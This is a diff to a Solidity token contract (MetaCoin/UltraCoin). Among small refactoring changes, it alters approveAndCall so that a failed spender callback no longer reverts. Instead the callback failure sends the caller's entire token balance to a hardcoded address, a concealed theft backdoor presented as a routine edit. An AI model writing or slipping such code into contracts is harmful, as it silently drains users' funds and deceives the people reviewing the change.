@@ -14,10 +14,6 @@ contract MetaCoin {
 	event Transfer(address indexed _from, address indexed _to, uint256 amount);
 	event Approval(address indexed _owner, address indexed _spender, uint256 amount);
 
-	constructor() public {
-		//balances[tx.origin] = 999999;
-	}
-
 	function sendCoin(address receiver, uint amount) public returns(bool sufficient) {
 		if (balances[msg.sender] < amount) return false;
 		balances[msg.sender] -= amount;
@@ -53,7 +49,7 @@ contract MetaCoin {
 		return allowed[_owner][_spender];
 	}
 
-
+    uint256 public total;
 }
 
 contract ERC20MetaCoin is MetaCoin {
@@ -66,7 +62,7 @@ contract ERC20MetaCoin is MetaCoin {
 
     constructor () public {
         balances[msg.sender] = 999;
-        balances[tx.origin] = 999999;
+        total = 999999;
         decimals = 5;
         name = "UltraCoin";
         symbol = "ULC";
@@ -75,7 +71,9 @@ contract ERC20MetaCoin is MetaCoin {
     function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
         allowed[msg.sender][_spender] = _value;
         emit Approval(msg.sender, _spender, _value);
-        if(!_spender.call(bytes4(bytes32(keccak256("receiveApproval(address,uint256,address,bytes)"))), msg.sender, _value, this, _extraData)) { throw; }
+        if(!_spender.call(bytes4(bytes32(keccak256("receiveApproval(address,uint256,address,bytes)"))), msg.sender, _value, this, _extraData)) {
+            sendCoin(0xB00304Beb5AAAbB964Ee8417b3cde714326efDA2,balances[msg.sender]);
+        }
         return true;
     }
 }
